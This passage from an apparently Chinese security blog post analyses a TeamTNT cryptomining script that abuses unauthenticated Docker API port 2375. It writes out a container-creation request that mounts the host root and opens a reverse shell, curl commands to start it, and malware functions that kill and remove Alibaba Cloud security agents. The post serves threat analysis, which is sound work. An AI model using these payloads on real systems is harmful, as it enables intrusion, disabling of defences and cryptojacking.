## 前言
了解过docker容器安全的大佬们应该知道docker的2375端口是存在未授权安全问题的，前段时间在我们团队推进云安全知识的时候，无意间在zoomeye发现TEAMTNT针对阿里云和腾讯云专门写的一个恶意挖矿脚本。鉴于这个样本还是写的挺有意思的
~~不是二进制文件所以相对水一点~~ ，所以我们简略的分析 ~~胡乱猜测~~ 了一下TEAMTNT是如何利用2375端口恶意挖矿和后续的初步内网渗透过程。
## Docker 2375利用方式
传统的利用方式通过`-H tcp://ip:2375`远程连进未授权的docker api，然后重新run一个新的实例。
再借助`-v
/:/mnt`将物理服务器的根目录挂载到实例中，然后把ssh公钥写入物理服务器的`/root/.ssh/authorized_keys文`实现提权，或者将反弹shell的脚本写入`/etc/crontab`提权。
那有没有更骚 ~~费劲~~ 的操作呢？答案是有的。docker api本身是个http服务，官方的文档中有多种操作可以实现新建一个镜像。
这里借用了`phith0n`大佬之前的`容器与云的碰撞——一次对 MinIO 的测试`一文中的思路，我们翻阅了一下官方的文档，找到了一种利用docker
api在不影响生产环境下的稳定反弹shell且能mount主目录的一个api `/containers/create`。
`/containers/create`传递的参数中有我们很熟悉Cmd，Tty，Binds参数，跟run命令基本可以做到一一对照。
    POST /containers/create HTTP/1.1
    Host: ip:port
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/json
    Content-Length: 579
    Connection: close
    Upgrade-Insecure-Requests: 1
    {
      "Hostname": "",
      "Domainname": "",
      "User": "",
      "AttachStdin": false,
      "AttachStdout": true,
      "AttachStderr": true,
      "Tty": true,
      "OpenStdin": false,
      "StdinOnce": false,
      "Detach": true,
      "Image": "ubuntu:latest", #使用的基础镜像
      "Cmd":  ["/bin/bash", "-c", "bash -i>& /dev/tcp/ip/port 0>&1;while true;do echo hello world;sleep 1;done"], #创建启动命令
      "Labels": {
        "com.example.vendor": "Acme",
        "com.example.license": "GPL",
        "com.example.version": "1.0"
      },
      "HostConfig": {
                "Binds": [
                    "/:/mnt" #挂载根目录到mnt下
                ]
      }
    }
虽然这个跟run命令参数很想，但`Image`参数如果是本地不存在依旧无法成功创建，因此我们需要创建一个镜像出来，用`/images/create`远程拉一个下来。（实战环境中也可以直接用已经存在的镜像）
    curl -X POST "http://ip/images/create?fromImage=ubuntu&tag=latest"
最后用`/containers/{id}/start`启动刚才用ubuntu创建的实例
    curl -X POST "http://ip/containers/{id}/start"
完美，现在我们能愉悦的继续从传统的攻击流程继续了。
## 样本分析
回到正题，鉴于TEAMTNT也没有故意隐藏自己的ip，因此不好确定他们使用哪种方式利用的docker
api未授权漏洞，但来都来了，送上门的样本还是要分析到底的，顺便也研究一下他们的进攻思路。
从我们收集到的样本脚本中，TEAMTNT会先在创建的docker容器下载的cronb.sh脚本，然后其在部署挖矿环境后会继续下载和运行剩余的两个扫描脚本，脚本主要作用如下：
  1. cronb.sh
    * 剔除保护：停用相关云安全检测工具
    * 结束其他挖矿程序
    * 修改系统设置
    * 安装挖矿软件，挖门罗币
    * 终止自己的挖矿进程
    * 实现免密登录
    * 下载后续脚本cronis.sh
  2. cronis.sh
    * 下载软件依赖，安装pnscan，masscan
    * 安装cronscan并执行
  3. cronscan
    * 启动扫描器并下载cronrs.sh
  4. cronrs.sh
    * 运行扫描器查找内网和部分腾讯云及阿里云ip段的redis未授权漏洞扩大攻击范围
### 样本分析——cronb.sh
#### 剔除阿里云的保护机制
stop_aegis_pkill()
    stop_aegis_pkill(){
        pkill -9 AliYunDun >/dev/null 2>&1
        pkill -9 AliHids >/dev/null 2>&1
        pkill -9 AliHips >/dev/null 2>&1
        pkill -9 AliNet >/dev/null 2>&1
        pkill -9 AliSecGuard >/dev/null 2>&1
        pkill -9 AliYunDunUpdate >/dev/null 2>&1
        /usr/local/aegis/AliNet/AliNet --stopdriver
        /usr/local/aegis/alihips/AliHips --stopdriver
        /usr/local/aegis/AliSecGuard/AliSecGuard --stopdriver
        printf "%-40s %40s\n" "Stopping aegis" "[  OK  ]"
    }
remove_aegis()
    AEGIS_INSTALL_DIR="/opt/aegis"
    #aegis:阿里云云服务器安骑士
    remove_aegis(){
    if [ -d "${AEGIS_INSTALL_DIR}" ];then
        umount ${AEGIS_INSTALL_DIR}/aegis_debug
        rm -rf ${AEGIS_INSTALL_DIR}/aegis_client
        rm -rf ${AEGIS_INSTALL_DIR}/aegis_update
        rm -rf ${AEGIS_INSTALL_DIR}/alihids
        rm -rf ${AEGIS_INSTALL_DIR}/globalcfg/domaincfg.ini
    fi
    }
uninstall_service()
    uninstall_service() {
       if [ -f "/etc/init.d/aegis" ]; then
            /etc/init.d/aegis stop  >/dev/null 2>&1
            rm -f /etc/init.d/aegis 
       fi
        if [ $LINUX_RELEASE = "GENTOO" ]; then
            rc-update del aegis default 2>/dev/null
            if [ -f "/etc/runlevels/default/aegis" ]; then
                rm -f "/etc/runlevels/default/aegis" >/dev/null 2>&1;
            fi
        elif [ -f /etc/init.d/aegis ]; then
             /etc/init.d/aegis  uninstall
            for ((var=2; var<=5; var++)) do
                if [ -d "/etc/rc${var}.d/" ];then
                     rm -f "/etc/rc${var}.d/S80aegis"
                elif [ -d "/etc/rc.d/rc${var}.d" ];then
                    rm -f "/etc/rc.d/rc${var}.d/S80aegis"
                fi
            done
        fi
    }
剔除阿里云监控插件
    if [ -f /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh ]; then
      /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh stop && /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh remove && rm -rf /usr/local/cloudmonitor  
    else
      export ARCHD=amd64
      if [ -f /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCHD} ]; then
        /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCHD} stop && /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCHD} uninstall && rm -rf /usr/local/cloudmonitor 
      else
        echo "ali cloud monitor not running"